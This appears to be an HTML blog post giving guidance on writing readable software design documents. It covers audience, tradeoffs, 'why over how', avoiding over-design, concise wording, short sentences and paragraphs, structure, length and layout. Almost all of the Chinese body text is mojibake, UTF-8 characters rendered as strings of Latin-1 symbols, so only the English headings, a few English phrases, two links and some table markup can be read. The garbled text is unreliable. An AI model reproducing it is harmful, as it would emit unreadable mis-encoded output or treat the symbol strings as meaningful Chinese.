<p>é€šè¿‡è®¾è®¡æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ï¼š</p>
<ul>
<li><p>åœ¨å¯ä»¥ä½æˆæœ¬è¿­ä»£çš„æ—¶å€™ï¼Œå°½æ—©å‘ç°è®¾è®¡ä¸­çš„é—®é¢˜</p>
</li>
<li><ul>
<li>è®¾è®¡å·¦ç§»ï¼Œä»£ä»·å·¦ç§»</li>
</ul>
</li>
<li><p>åœ¨å›¢é˜Ÿä¸­å¯¹è®¾è®¡è¾¾æˆä¸€è‡´</p>
</li>
<li><ul>
<li>è®¾è®¡çš„æœ¬è´¨æ˜¯å–èˆ(tradeoff)ã€‚å‡ ä¹æ‰€æœ‰çš„æ¶æ„è®¾è®¡å†³ç­–éƒ½ä¼šè¢«æŒ‘æˆ˜ï¼ŒåŸå› ä¹‹ä¸€æ˜¯è¯»è€…å¹¶éå¯¹æ‰€æœ‰çš„å–èˆéƒ½çŸ¥æ™“å¹¶ä¸ä½œè€…è¾¾æˆå…±è¯†ã€‚å°† pros&#x2F;cons é€šè¿‡è®¾è®¡æ–‡æ¡£æ¸…æ™°åœ°åˆ—å‡ºå–èˆï¼Œæœ‰åˆ©äºå¸®åŠ©è¯»è€…äº†è§£ï¼ˆå¹¶è®¤å¯ï¼‰ä½ çš„å†³ç­–æ€è·¯ï¼Œå¯ä»¥å‡å°‘è¢«æŒ‘æˆ˜çš„å¯èƒ½ã€‚</li>
</ul>
</li>
<li><p>å°†èµ„æ·±å·¥ç¨‹å¸ˆçš„ç»éªŒå’Œæ€æƒ³æ‰©å±•åˆ°æ•´ä¸ªå›¢é˜Ÿï¼Œå¸®åŠ©å›¢é˜Ÿæˆé•¿</p>
</li>
<li><ul>
<li>ä½œä¸ºä½œè€…ï¼Œå¯ä»¥ä¾›èµ„æµ…å·¥ç¨‹å¸ˆå­¦ä¹ </li>
<li>ä½œä¸ºè¯»è€…ï¼Œå¯ä»¥å®¡æ ¸èµ„æµ…å·¥ç¨‹å¸ˆçš„è®¾è®¡å¹¶æä¾›å»ºè®®</li>
</ul>
</li>
<li><p>å½¢æˆå›¢é˜Ÿè½¯ä»¶è®¾è®¡çš„ä¸€è‡´æ–¹å¼ï¼Œæ²‰æ·€å›¢é˜Ÿ&#x2F;å…¬å¸æŠ€æœ¯ç§¯ç´¯</p>
</li>
<li><ul>
<li>ä¼ä¸šçš„ç”Ÿå‘½åŠ›åœ¨äºçŸ¥è¯†ä»·å€¼çš„ç§¯ç´¯</li>
</ul>
</li>
</ul>
<p>è®¾è®¡æ–‡æ¡£æ˜¯éœ€è¦ç¼–å†™æˆæœ¬çš„ã€‚ å¦‚æœé—®é¢˜çš„è§£å†³æ–¹æ¡ˆéå¸¸æ¸…æ™°ï¼Œæ²¡æœ‰æ˜ç¡®çš„å–èˆï¼Œè®¾è®¡æ–‡æ¡£ä¸­åŸºæœ¬éƒ½æ˜¯å®ç°æè¿°ï¼Œåˆ™åº”è¯¥çœç•¥è®¾è®¡æ–‡æ¡£è€Œç›´æ¥å®ç°ã€‚æ¢è¨€ä¹‹ï¼Œå¦‚æœç¼–å†™è®¾è®¡æ–‡æ¡£çš„æ—¶é—´ä¸»è¦æ¶ˆè€—åœ¨â€œå†™â€è€Œä¸æ˜¯åœ¨â€œæ€è€ƒâ€ä¸Šï¼Œåˆ™è¿™ä¸ªè®¾è®¡æ–‡æ¡£å¯çœç•¥ã€‚</p>
<h1 id="Why-call-it-Readability"><a href="#Why-call-it-Readability" class="headerlink" title="Why call it Readability?"></a><strong>Why call it Readability?</strong></h1><h3 id="è®¾è®¡æ–‡æ¡£çš„è¯»å†™æ¯”æœ€é«˜"><a href="#è®¾è®¡æ–‡æ¡£çš„è¯»å†™æ¯”æœ€é«˜" class="headerlink" title="è®¾è®¡æ–‡æ¡£çš„è¯»å†™æ¯”æœ€é«˜"></a><strong>è®¾è®¡æ–‡æ¡£çš„è¯»å†™æ¯”æœ€é«˜</strong></h3><p>è®¾è®¡æ–‡æ¡£ &gt; API &gt; ä»£ç </p>
<p>è®¾è®¡æ–‡æ¡£ç”¨æ¥è¢«è¯»çš„æ—¶é—´å¾€å¾€è¿œå¤šäºå†™çš„æ—¶é—´ã€‚å› æ­¤ï¼Œç¼–å†™è®¾è®¡æ–‡æ¡£æ—¶æ›´åº”è¯¥è€ƒè™‘è¯»è€…çš„ä½“éªŒè€Œéä½œè€…çš„ä½“éªŒã€‚</p>
<h3 id="è®¾è®¡æ–‡æ¡£ä¸æ˜¯æ–‡å­¦å†™ä½œ"><a href="#è®¾è®¡æ–‡æ¡£ä¸æ˜¯æ–‡å­¦å†™ä½œ" class="headerlink" title="è®¾è®¡æ–‡æ¡£ä¸æ˜¯æ–‡å­¦å†™ä½œ"></a><strong>è®¾è®¡æ–‡æ¡£ä¸æ˜¯æ–‡å­¦å†™ä½œ</strong></h3><p>è®¾è®¡æ–‡æ¡£çš„ç›®çš„æ˜¯ä¸ºäº†æ²Ÿé€šè®¾è®¡ï¼Œè€Œä¸æ˜¯ä¸ºäº†è‡ªæˆ‘è¡¨è¾¾ã€‚</p>
<p>æŠŠç²¾åŠ›æ”¾åœ¨å¦‚ä½•æ¸…æ™°ã€ç®€æ´åœ°è¡¨è¾¾ï¼Œè€Œéæ”¾åœ¨æ–‡é‡‡ä¸Šã€‚</p>
<h3 id="ä¸ºè¯»è€…è€Œå†™"><a href="#ä¸ºè¯»è€…è€Œå†™" class="headerlink" title="ä¸ºè¯»è€…è€Œå†™"></a><strong>ä¸ºè¯»è€…è€Œå†™</strong></h3><p>é¦–å…ˆï¼Œäº†è§£ä½ çš„è¯»è€…ã€‚</p>
<p>è¯»è€…ç¾¤ä½“æ˜¯è°ï¼Ÿ</p>
<p> è¯»è€…ä¸åº”è¯¥åªæ˜¯ä½ çš„ TL ä»¥åŠè¯¥è®¾è®¡æ–‡æ¡£çš„å®æ–½è€…ï¼› ä½ çš„è®¾è®¡æ–‡æ¡£çœŸæ­£å—ä¼—çš„èŒƒå›´å¾€å¾€å¤§å¾—å¤šã€‚åœ¨ä¸ç¡®å®šçš„æ—¶å€™ï¼Œç»éªŒåšæ³•æ˜¯ï¼Œå‡è®¾çš„è¯»è€…ç¾¤ä½“ä¸ºï¼šå…¬å¸å†…éƒ¨çš„ã€æœ‰ä¸€å®šå·¥ç¨‹ç»éªŒçš„ã€ä½†å¯¹è¯¥ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡åªæœ‰åˆæ­¥äº†è§£çš„è½¯ä»¶å·¥ç¨‹å¸ˆã€‚</p>
<p>é€šå¸¸ï¼Œè®¾è®¡æ–‡æ¡£çš„èŒƒå›´è¶Šå¤§ï¼Œå‡å®šçš„å—ä¼—ç¾¤ä¹Ÿä¼šæ›´å¤§ï¼Œä¹Ÿå°±æ„å‘³ç€å—ä¼—å¯¹ç›®æ ‡ç³»ç»Ÿçš„å¹³å‡äº†è§£ç¨‹åº¦æ›´ä½ï¼Œä¹Ÿå°±æ„å‘³ç€è®¾è®¡æ–‡æ¡£å¾€å¾€éœ€è¦ï¼š</p>
<ul>
<li>æ›´åŠ è¯¦ç»†çš„èƒŒæ™¯ä»‹ç»</li>
<li>æ›´å°‘ä½¿ç”¨å†…éƒ¨æœ¯è¯­æˆ–ç¼©å†™</li>
<li>æ›´å¤šé˜è¿°è®¾è®¡æ€è·¯ã€å–èˆï¼Œæ›´å°‘è§£é‡Šå…·ä½“å®ç°ç»†èŠ‚</li>
</ul>
<p>è¯»è€…å¦‚ä½•é˜…è¯»ï¼Ÿ </p>
<p>å¤§éƒ¨åˆ†è¯»è€…ä¸ä¼šé€å­—é€å¥é˜…è¯»ä½ çš„è®¾è®¡æ–‡æ¡£ã€‚å¤§å®¶éƒ½å¾ˆå¿™ã€‚ è¯»è€…é€šå¸¸åªä¼šæ‰«æå¤§ä½“ç»“æ„ï¼Œç„¶åé˜…è¯»è‡ªå·±æ„Ÿå…´è¶£çš„éƒ¨åˆ†ã€‚ </p>
<h3 id="è®¾è®¡æ–‡æ¡£-VS-ä»£ç -Readability"><a href="#è®¾è®¡æ–‡æ¡£-VS-ä»£ç -Readability" class="headerlink" title="è®¾è®¡æ–‡æ¡£ VS ä»£ç  Readability"></a><strong>è®¾è®¡æ–‡æ¡£ VS ä»£ç  Readability</strong></h3><ul>
<li>ç€é‡å¼ºè°ƒçš„å†…å®¹åº”è¯¥æ˜¯å¹¶éæ˜¾è€Œæ˜“è§çš„äº‹é¡¹ï¼š</li>
</ul>
<table>
<thead>
<tr>
<th><strong>è®¾è®¡æ–‡æ¡£</strong></th>
<th><strong>ä»£ç æ–‡æ¡£</strong></th>
</tr>
</thead>
<tbody><tr>
<td>èƒŒæ™¯</td>
<td>ä¸Šä¸‹æ–‡</td>
</tr>
<tr>
<td>å¼ºè°ƒ Why&#x2F;æƒè¡¡&#x2F;å…¶å®ƒæ–¹æ¡ˆ</td>
<td>å¼ºè°ƒ â€œWhyâ€ åŠ¨æœº</td>
</tr>
<tr>
<td>æ³¨æ„äº‹é¡¹</td>
<td>æ³¨æ„äº‹é¡¹</td>
</tr>
<tr>
<td>ä»£ç å¯ä»¥æ¸…æ™°è¡¨è¾¾çš„å†…å®¹ä¸éœ€è¦æ–‡æ¡£</td>
<td>ä»£ç å¯ä»¥æ¸…æ™°è¡¨è¾¾çš„å†…å®¹ä¸éœ€è¦æ–‡æ¡£</td>
</tr>
</tbody></table>
<ul>
<li><p>æ²¡æœ‰ç»å¯¹çš„æ­£ç¡®ç­”æ¡ˆï¼šæ²¡æœ‰å®Œç¾çš„ä»£ç ï¼Œä¹Ÿæ²¡æœ‰å®Œç¾çš„è®¾è®¡æ–‡æ¡£ã€‚</p>
</li>
<li><ul>
<li>ä¸åŒçš„è¯»è€…å¯¹å¯è¯»æ€§çš„ç†è§£æœ‰ç»†å¾®çš„ä¸åŒã€‚ å¯è¯»æ€§æ˜¯ä¸»è§‚çš„ã€‚</li>
<li>åœ¨å®è·µä¸­ï¼Œæˆ‘ä»¬è¿½æ±‚è®©æ›´å¤šï¼ˆè€Œéæ‰€æœ‰ï¼‰è¯»è€…æ›´é¡ºç•…åœ°é˜…è¯»è®¾è®¡æ–‡æ¡£ã€‚</li>
</ul>
</li>
<li><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æœ‰æ„è¯†åœ°æé«˜æ–‡æ¡£å†™ä½œ&#x2F;ä»£ç æ°´å¹³ã€‚é«˜è´¨é‡çš„å†™ä½œæ˜¯ä¸€ç§ä¹ æƒ¯ã€‚</p>
</li>
<li><ul>
<li>å¤šè¯»</li>
<li>è¯„å®¡ ï¼ˆDesign doc review&#x2F;Code reviewï¼‰æœ‰ç›Š</li>
<li>å¤šå†™</li>
</ul>
</li>
</ul>
<h2 id="ä¸ºè¯»è€…è€Œå†™-1"><a href="#ä¸ºè¯»è€…è€Œå†™-1" class="headerlink" title="ä¸ºè¯»è€…è€Œå†™"></a>ä¸ºè¯»è€…è€Œå†™</h2><p>è¦äº†è§£è¯»è€…ç”»åƒ</p>
<p>å¤§éƒ¨åˆ†è¯»è€…ä¸ä¼šå¾ˆè¯¦ç»†çš„è¯»ï¼Œå¾—è®©è¯»è€…åœ¨çŸ­æ—¶é—´å†…äº†è§£æ•´ä½“æ€æƒ³</p>
<h1 id="Core-Principles"><a href="#Core-Principles" class="headerlink" title="Core Principles"></a><strong>Core Principles</strong></h1><h3 id="å†™ä½œé£æ ¼çš„ä¸‰è¦ç´ "><a href="#å†™ä½œé£æ ¼çš„ä¸‰è¦ç´ " class="headerlink" title="å†™ä½œé£æ ¼çš„ä¸‰è¦ç´ "></a><strong>å†™ä½œé£æ ¼çš„ä¸‰è¦ç´ </strong></h3><ul>
<li>æ¸…æ™°</li>
<li>ç®€æ´</li>
<li>ä¼˜é›…</li>
</ul>
<h3 id="è®¾è®¡çš„è¦ç‚¹"><a href="#è®¾è®¡çš„è¦ç‚¹" class="headerlink" title="è®¾è®¡çš„è¦ç‚¹"></a><strong>è®¾è®¡çš„è¦ç‚¹</strong></h3><h4 id="ä»»ä½•æ¶æ„é—®é¢˜éƒ½æ˜¯å–èˆã€‚"><a href="#ä»»ä½•æ¶æ„é—®é¢˜éƒ½æ˜¯å–èˆã€‚" class="headerlink" title="ä»»ä½•æ¶æ„é—®é¢˜éƒ½æ˜¯å–èˆã€‚"></a><strong>ä»»ä½•æ¶æ„é—®é¢˜éƒ½æ˜¯å–èˆã€‚</strong></h4><p>Everything in software architecture is a tradeoff.</p>
<p>åœ¨è½¯ä»¶è®¾è®¡ä¸­ï¼Œæ²¡æœ‰ä»»ä½•ä¸€ä¸ªç»´åº¦æœ‰ç»å¯¹æ„ä¹‰ä¸Šçš„ä¼˜åŠ£ã€‚ æ¯ä¸€ä¸ªè®¾è®¡å†³å®šéƒ½éœ€è¦è€ƒé‡å¾ˆå¤šç›¸è¿èƒŒçš„å› ç´ ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¯æ‰©å±•æ€§å’Œæ•ˆç‡ç›¸èƒŒï¼› é•¿æœŸæ•ˆç‡å’ŒçŸ­æœŸæ”¶ç›Šç›¸èƒŒï¼›è§„æ¨¡åŒ–æå‡äº†æ•ˆç‡ï¼Œä½†é™ä½äº†çµæ´»æ€§ã€‚â€œé«˜å†…èšä½è€¦åˆâ€ ä¾¿äºè¿­ä»£ï¼Œä½†æ˜¯ä¼šå¢åŠ çŸ­æœŸçš„å¼€å‘æˆæœ¬ã€‚ NoSQL æ¯” SQL æ€§èƒ½é«˜ï¼Œä½†ä»£ä»·æ˜¯åŠŸèƒ½çš„å¤§å¹…é™ä½ã€‚</p>
<p>å¦‚æœä¸€ä¸ªè®¾è®¡å†³ç­–çœ‹ä¸Šå»æ²¡æœ‰ä»»ä½•çš„å–èˆï¼Œå¾€å¾€æ˜¯å› ä¸ºå–èˆè¿˜æ²¡æœ‰è¢«è¯†åˆ«ã€‚</p>
<h4 id="â€œä¸ºä»€ä¹ˆâ€-æ¯”-â€œæ€ä¹ˆåšâ€-æ›´é‡è¦ã€‚"><a href="#â€œä¸ºä»€ä¹ˆâ€-æ¯”-â€œæ€ä¹ˆåšâ€-æ›´é‡è¦ã€‚" class="headerlink" title="â€œä¸ºä»€ä¹ˆâ€ æ¯” â€œæ€ä¹ˆåšâ€ æ›´é‡è¦ã€‚"></a><strong>â€œä¸ºä»€ä¹ˆâ€ æ¯” â€œæ€ä¹ˆåšâ€ æ›´é‡è¦ã€‚</strong></h4><p>WHY is more important than HOW.</p>
<h4 id="è€ƒè™‘æ—¶é—´ç»´åº¦"><a href="#è€ƒè™‘æ—¶é—´ç»´åº¦" class="headerlink" title="è€ƒè™‘æ—¶é—´ç»´åº¦"></a><strong>è€ƒè™‘æ—¶é—´ç»´åº¦</strong></h4><p>Software Engineering &#x3D; Codng * Time.</p>
<p>åšè®¾è®¡å–èˆæ—¶éœ€è¦è€ƒè™‘å¯ç»´æŠ¤æ€§ã€å¯æ‰©å±•æ€§ã€‚ è€ƒè™‘æœªæ¥è®¡åˆ’ã€‚</p>
<h4 id="é¿å…è¿‡åº¦è®¾è®¡"><a href="#é¿å…è¿‡åº¦è®¾è®¡" class="headerlink" title="é¿å…è¿‡åº¦è®¾è®¡"></a><strong>é¿å…è¿‡åº¦è®¾è®¡</strong></h4><p>Avoid over design.</p>
<p>è®¾è®¡ä¼Šå§‹ï¼Œç•Œå®šé—®é¢˜çš„èŒƒå›´ã€‚ ä¸€ä¸ªè‰¯å¥½ç•Œå®šçš„é—®é¢˜æ˜¯ä¸€ä¸ªè‰¯å¥½è®¾è®¡çš„å¿…è¦æ¡ä»¶ã€‚</p>
<p>ä¸è¦è¿·ä¿¡è®¾è®¡æ¨¡å‹ã€è®¾è®¡æ¨¡å¼ã€XX é©±åŠ¨è®¾è®¡ã€‚è¿™äº›æ˜¯å·¥å…·ï¼Œè€Œéæ³•åˆ™ã€‚ä¸è¦ä¸ºäº†åˆ¶é€ é—®é¢˜è€Œè§£å†³é—®é¢˜ã€‚ä¸è¦é€šè¿‡å¤æ‚çš„è®¾è®¡æ¥ä½“ç°å·¥ä½œçš„éš¾åº¦å’Œæ·±åº¦: ä¸€ä¸ªå›°éš¾çš„é—®é¢˜å¯èƒ½ä¼šæœ‰ä¸€ä¸ªç®€å•çš„ç­”æ¡ˆã€‚</p>
<p>ä¸è¦è¿‡äºæ‹…å¿§è®¾è®¡è¿…é€Ÿæ·˜æ±°ã€‚ä¿ç•™å¯æ‰©å±•æ€§ï¼Œä½†ä¸è¦åœ¨æœªçŸ¥æ—¶æµªè´¹ç²¾åŠ›æ‰©å±•ã€‚ </p>
<p><a href="https://www.itworks.hu/the-parable-of-the-object-oriented-programmer-and-breakfast/">https://www.itworks.hu/the-parable-of-the-object-oriented-programmer-and-breakfast/</a></p>
<p><a href="https://github.com/EnterpriseQualityCoding/FizzBuzzEnterpriseEdition">https://github.com/EnterpriseQualityCoding/FizzBuzzEnterpriseEdition</a></p>
<h1 id="Design-Doc-Best-Practices"><a href="#Design-Doc-Best-Practices" class="headerlink" title="Design Doc Best Practices"></a><strong>Design Doc Best Practices</strong></h1><h2 id="é£è¯"><a href="#é£è¯" class="headerlink" title="é£è¯"></a><strong>é£è¯</strong></h2><p>ç”¨è¯è¦ç®€ç»ƒã€å‡†ç¡®ã€ç›´ç™½ã€‚</p>
<ul>
<li><p>æ­£ç¡®ä½¿ç”¨ä¸“ä¸šæœ¯è¯­ã€‚</p>
</li>
<li><ul>
<li><p>åˆç†åœ°ä½¿ç”¨å¸¸è§æœ¯è¯­å¯ä»¥é™ä½æ²Ÿé€šæˆæœ¬ã€‚</p>
</li>
<li><p>ä¸è¦è¿‡å¤šä½¿ç”¨è¿‡äºå°ä¼—æˆ–è‡ªåˆ›çš„æœ¯è¯­ã€‚å¦‚æœæœ‰å¿…è¦ï¼Œéœ€è¦åœ¨æ–‡ä¸­</p>
</li>
<li><ul>
<li>å¿…è¦æ—¶æä¾›å¯¹ç…§çš„è‹±æ–‡æœ¯è¯­ä»¥æ–¹ä¾¿ç†è§£ã€‚</li>
<li>é¿å…æ— ä¸Šä¸‹æ–‡çš„ç¼©ç•¥è¯ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p>çœç•¥ç¨‹åº¦å‰¯è¯</p>
</li>
<li><ul>
<li>ä¸ç®¡ä½œè€…æ„å›¾ä¸ºä½•ï¼Œ â€œéå¸¸é‡è¦â€ å’Œ â€œé‡è¦â€ åœ¨è¯»è€…çœ‹æ¥å¤§åŒå°å¼‚ã€‚</li>
</ul>
</li>
<li><p>ä½¿ç”¨æ•°æ®</p>
</li>
<li><ul>
<li>ä¸å…¶è¯´æ˜â€œè¯¥ç³»ç»Ÿçš„æ€§èƒ½æå‡æ˜æ˜¾â€ï¼Œä¸å¦‚â€œè¯¥ç³»ç»Ÿçš„æ€§èƒ½æå‡äº†42%â€æ›´ä¸ºå¯ä¿¡ï¼Œä¹Ÿæ›´æ–¹ä¾¿è¯»è€…åšå‡ºè‡ªå·±çš„åˆ¤æ–­ã€‚</li>
</ul>
</li>
<li><p>å¿Œä½¶å±ˆè±ç‰™</p>
</li>
<li><ul>
<li>ä¾‹å¦‚ä¸Šæ–‡ï¼Œåº”æ”¹ä¸ºâ€œä¸è¦ä½¿ç”¨è¿‡äºç”Ÿåƒ»çš„è¯æ±‡ï¼Œä¸è¦è¿‡åº¦ä½¿ç”¨ä¹¦é¢è¯­â€</li>
<li>åƒä¸‡ä¸è¦å†™æ–‡è¨€æ–‡</li>
</ul>
</li>
</ul>
<h2 id="é€ å¥"><a href="#é€ å¥" class="headerlink" title="é€ å¥"></a><strong>é€ å¥</strong></h2><ul>
<li><p>ä½¿ç”¨çŸ­å¥ï¼Œä¸è¦ä½¿ç”¨å¤šä»å¥çš„å¤æ‚å¥å¼ã€‚</p>
</li>
<li><ul>
<li>è¯»è€…ä¸æ˜¯æ¥è€ƒ GRE çš„ã€‚</li>
<li>å†™æ–‡æ¡£ä¹Ÿä¸æ˜¯ä¸ºäº†ç‚«è€€è‡ªå·±å¯ä»¥é©¾é©­é•¿éš¾å¥ã€‚</li>
</ul>
</li>
</ul>
<p><em>â€œç³»ç»Ÿå½¢å¼é—®é¢˜å°±æ˜¯ä¸‹é¢è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼šæ€æ ·æŠŠå„ç§ä¸åŒçš„å¯¹è±¡ç§ç±»å®‰æ’åœ¨ä¸€ä¸ªç³»ç»Ÿä¸­ï¼Œä»¥ä½¿è¾ƒé«˜çš„å¯¹è±¡ç§ç±»æ€»èƒ½ä»è¾ƒä½çš„å¯¹è±¡ç§ç±»æ„é€ å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯è¯´å‰è€…å¯è¿˜åŸä¸ºåè€…ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¿…é¡»ä»å…¶ç›¸äº’å¯è¿˜åŸæ€§æ¥ç ”ç©¶å„ç§ä¸åŒçš„å¯¹è±¡ç§ç±»ã€‚ä¸ºæ­¤ç›®çš„ï¼Œæˆ‘ä»¬è¦æ ¹æ®æ‰€æ¶‰åŠçš„å¯¹è±¡é¢†åŸŸçš„å®é™…ç§‘å­¦çŸ¥è¯†ä¸ºæ¯ä¸€ä¸ªè¦è€ƒå¯Ÿçš„å¯¹è±¡å¯»æ‰¾å…¶åŸºæœ¬äº‹å®å­˜åœ¨çš„å……åˆ†è€Œå¿…è¦çš„æ¡ä»¶çš„å„ç§å¯èƒ½æ€§ã€‚å¯¹æ­¤æˆ‘ä»¬å¯é‡‡å–ä¸‹é¢çš„åŠæ³•æ¥è¿›è¡Œï¼Œå³è¦æ±‚è¿™é—¨å®é™…ç§‘å­¦ç»™å‡ºåŸºæœ¬äº‹å®çš„ä¸€ä¸ªï¼ˆç¡®å®è€Œå¸¸åœ¨çš„ï¼‰è¡¨å¾ã€‚â€</em></p>
<p><em>Excerpt From: ã€å¾·ã€‘é²é“å¤«Â·å¡å°”çº³æ™®. â€œä¸–ç•Œçš„é€»è¾‘æ„é€ .â€</em> </p>
<ul>
<li><p>ç®€å•è¡¨è¾¾ï¼Œå»æ‰æ— æ„ä¹‰çš„ä¿®é¥°ï¼Œå»æ‰è¯•å›¾ç¼“å’Œè¯­æ°”çš„ä»å¥ã€‚</p>
</li>
<li><ul>
<li><p>åä¾‹ï¼šâ€œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ TencentDB åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥æ»¡è¶³æˆ‘ä»¬å¯¹äº‹åŠ¡æ”¯æŒçš„éœ€æ±‚ã€‚â€</p>
</li>
<li><ul>
<li>ä¿®æ”¹åï¼šâ€œTencentDB æ”¯æŒäº‹åŠ¡â€ã€‚</li>
</ul>
</li>
<li><p>åä¾‹ï¼š â€œMR æäº¤ä¿¡æ¯ä½œä¸ºè¯»è€…æŸ¥é˜…ä¿®æ”¹å†å²æ—¶ç¬¬ä¸€æ—¶é—´çœ‹åˆ°çš„ä¿¡æ¯ï¼Œå…¶é‡è¦æ€§ä¸è¨€è€Œå–»ã€‚â€</p>
</li>
<li><ul>
<li>ä¿®æ”¹åï¼šâ€œè¯»è€…æŸ¥é˜…ä¿®æ”¹å†å²æ—¶ä¼šé¦–å…ˆå…³æ³¨ MR æäº¤ä¿¡æ¯ã€‚â€</li>
</ul>
</li>
<li><p>æœ¬æ®µè®¨è®ºå¦ä¸€ä¸ªé—®é¢˜ï¼Œå³â€¦â€¦</p>
</li>
</ul>
</li>
<li><p>é¿å…è¿‡äºå£è¯­åŒ–ã€‚</p>
</li>
<li><ul>
<li>ä¸è¦åŠ é¡ºå£æºœ</li>
<li>ä¸è¦ä½¿ç”¨è¯­æ°”è¯</li>
<li>ä¸è¦ä½¿ç”¨å¹å·ï¼ å¦‚æœå¸Œæœ›å¼ºè°ƒï¼Œä½¿ç”¨<strong>ç²—ä½“</strong>æˆ–è€…<em>æ–œä½“</em>å³å¯ï¼ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ†çº§æ ‡é¢˜ï¼ï¼ï¼</li>
</ul>
</li>
</ul>
<p>å‡†ç¡®</p>
<ul>
<li>æè¿°å®¢è§‚äº‹å®ï¼Œé¿å…åŠ å…¥ä¸»è§‚æƒ…ç»ªã€‚</li>
</ul>
<h2 id="æ®µè½"><a href="#æ®µè½" class="headerlink" title="æ®µè½"></a><strong>æ®µè½</strong></h2><p>æ®µè½åº”è¯¥å°½é‡çŸ­ã€‚é€šå¸¸ï¼Œä¸€ä¸ªæ®µè½ä¸è¦è¶…è¿‡ 8 ä¸ªå®Œæ•´çš„å¥å­ã€‚</p>
<p>æ¯ä¸ªæ®µè½æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ¸…æ™°çš„ä¸»é¢˜ã€‚æ¯ä¸ªæ®µè½å¼€å¤´åº”è¯¥æ˜¯ä¸»é¢˜å¥ï¼Œæ–¹ä¾¿è¯»è€…å¿«é€Ÿäº†è§£æ®µè½å¤§æ„ã€‚æ®µè½ä¸­çš„æ¯ä¸€å¥è¯åº”è¯¥ä¸ä¸»é¢˜ç´§å¯†ç›¸å…³ï¼› å¦åˆ™ï¼Œå®ƒåº”è¯¥å¦èµ·æ®µè½ï¼Œæˆ–è€…åº”è¯¥åˆ æ‰ã€‚</p>
<p>æ³¨æ„æ®µè½çš„æµåŠ¨ã€‚æ®µè½å¥å­åº”è¯¥å§‹äºä¸€ä¸ªè¯»è€…å·²ç»ç†Ÿæ‚‰çš„æ¦‚å¿µï¼Œå°†æ–°çš„å†…å®¹æ”¾åœ¨å¥å­ç»“å°¾ã€‚è¿™æ ·ï¼Œè¯»è€…å¯ä»¥æ›´è¿è´¯åœ°ç†è§£ã€‚</p>
<p>ä½¿ç”¨åˆ—è¡¨</p>
<p>ä½¿ç”¨ Bullet point æ ‡æ˜æ— é¡ºåºçš„åˆ—è¡¨ï¼Œä½¿ç”¨æ•°å­—åºå·æ˜ç¡®å‰åé¡ºåºã€‚</p>
<h2 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a><strong>ç»“æ„</strong></h2><p>ä½¿ç”¨æ¨¡æ¿</p>
<p>ä½¿ç”¨å›¾è¡¨</p>
<p>ä½¿ç”¨æ ‡é¢˜</p>
<p>æ ‡é¢˜è¦åˆ†çº§</p>
<p>æ ‡é¢˜è¦ç®€çŸ­æ¸…æ™°</p>
<h2 id="ç¯‡å¹…"><a href="#ç¯‡å¹…" class="headerlink" title="ç¯‡å¹…"></a><strong>ç¯‡å¹…</strong></h2><p>è®¾è®¡æ–‡æ¡£ä¸è¦è¿‡é•¿ã€‚å¤ªå¤šå†…å®¹å †ç§¯åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä¼šè®©è¯»è€…ä¸§å¤±å…´è¶£ã€‚</p>
<p>å¯¹äºä¸€ä¸ªå¤§å‹é¡¹ç›®æ¥è¯´ï¼Œ10é¡µï¼ˆ~5000å­—ï¼‰å·¦å³æ˜¯ä¸€ä¸ªåˆé€‚çš„é•¿åº¦ã€‚å½“è¶…è¿‡è¿™ä¸ªé•¿åº¦æ—¶ï¼Œå¯ä»¥è€ƒè™‘å°†é—®é¢˜æ‹†åˆ†æˆå­é—®é¢˜åˆ†åˆ«ç¼–å†™è®¾è®¡æ–‡æ¡£ï¼Œå¹¶åœ¨æ€»ä½“è®¾è®¡æ–‡æ¡£ä¸­é“¾æ¥å­è®¾è®¡æ–‡æ¡£ã€‚</p>
<p>å¯¹äºå°é—®é¢˜åšå¢é‡çš„æ”¹è¿›ï¼Œè€ƒè™‘ä½¿ç”¨å•é¡µæ–‡æ¡£(one-pager)ã€‚é€šå¸¸è¿™ç±»æ–‡æ¡£çš„èŒƒå›´è¾ƒå°ï¼Œè§£å†³é—®é¢˜è¾ƒç®€å•ï¼Œç›®æ ‡ç”¨æˆ·ç¾¤ä½“ä»…é™äºå¯¹é—®é¢˜å·²ç»æœ‰å……åˆ†äº†è§£çš„å†…éƒ¨æˆå‘˜ã€‚è¿™æ—¶ï¼Œå¯ä»¥çœç•¥èƒŒæ™¯ç­‰å†…å®¹ï¼Œè€Œä»…ä½¿ç”¨ ç›®æ ‡ â€“ æ–¹æ¡ˆ ä¸¤æ®µå¼è®ºè¯çš„ç»“æ„ã€‚</p>
<h2 id="æ’ç‰ˆ"><a href="#æ’ç‰ˆ" class="headerlink" title="æ’ç‰ˆ"></a><strong>æ’ç‰ˆ</strong></h2><p>ä½¿ç”¨ç»Ÿä¸€çš„å­—ä½“ã€‚ ç”¨æˆ·ä¸ä¼šæ„è¯†åˆ°ä¸åŒçš„å­—ä½“ä»£è¡¨ä¸åŒçš„å«ä¹‰ï¼Œåªä¼šæ„Ÿå—åˆ°æ··ä¹±ã€‚</p>
<p>å¾®è½¯é›…é»‘æ˜¯å®‰å…¨é€‰æ‹©ã€‚</p>
<p>ä¸è¦ä½¿ç”¨ä¸åŒé¢œè‰²æ¥åŒºåˆ†å†…å®¹ã€‚ä¸è¦åœ¨æ–‡ä¸­ä½¿ç”¨è¶…è¿‡ä¸‰ç§é¢œè‰²ã€‚ å¯ä»¥åœ¨æ ‡é¢˜åŠåˆ†çº§æ ‡é¢˜ä½¿ç”¨æ ‡å¿—æ€§çš„é¢œè‰²ï¼ŒåŒæ—¶æ­£æ–‡ä½¿ç”¨é»‘è‰²ã€‚</p>
